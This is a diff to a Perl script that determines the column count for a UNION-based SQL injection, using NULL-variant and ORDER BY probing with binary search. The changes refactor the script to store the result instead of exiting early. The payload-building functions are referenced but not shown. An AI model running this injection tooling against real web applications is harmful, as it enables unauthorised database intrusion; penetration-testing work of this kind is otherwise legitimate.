@@ -18,7 +18,9 @@ our (
     $null,
     $help,
     $binSearch,
-    $oracle
+    $oracle,
+
+    $amountOfColums
 );
 
 print "Determining number of columns for UNION based SQL injection\n";
@@ -65,13 +67,15 @@ if ($proxy) {
     }
 }
 
+say "Trying to obtain amount of columns...";
+
 if ($null) {
     for my $i (1..$maxTries) {
         my $payload = &nullVariantPayload($i);
         my $result = &sendRequest($payload);
         if ($result && $result != -1) {
-            print "Column number: $i\n";
-            exit;
+            $amountOfColums = $i;
+            last;
         }
     }
 } else {
@@ -86,15 +90,15 @@ if ($null) {
 
             if ($previousQuery{res} != -1 && abs($middle - $previousQuery{num}) == 1) {
                 if ($result == 0 && $previousQuery{res} == 1) {
-                    print "Column number: $nums[$previousQuery{num}]\n";
-                    exit;
+                    $amountOfColums = $nums[$previousQuery{num}];
+                    last;
                 }
             }
 
             if ($result == 1 && ($end - $begin) == 1) {
                 if (&sendRequest(&orderByVariantPayload($nums[$middle + 1])) == 0) {
-                    print "Column number: $nums[$previousQuery{num}]\n";
-                    exit;
+                    $amountOfColums = $nums[$previousQuery{num}];
+                    last;
                 }
             }
 
@@ -114,14 +118,18 @@ if ($null) {
             my $payload = &orderByVariantPayload($i);
             my $result = &sendRequest($payload);
             if (!$result && $result != -1) {
-                say "Column number: " . --$i;
-                exit;
+                $amountOfColums = $i - 1;
+                last;
             }
         }
     }
 }
 
-print "Couldn't find column number :(\n";
+if ($amountOfColums) {
+    say "Amount of columns: $amountOfColums";
+} else {
+    say "Couldn't find Number of columns :(";
+}
 
 sub sendRequest {
     my $payload = shift;
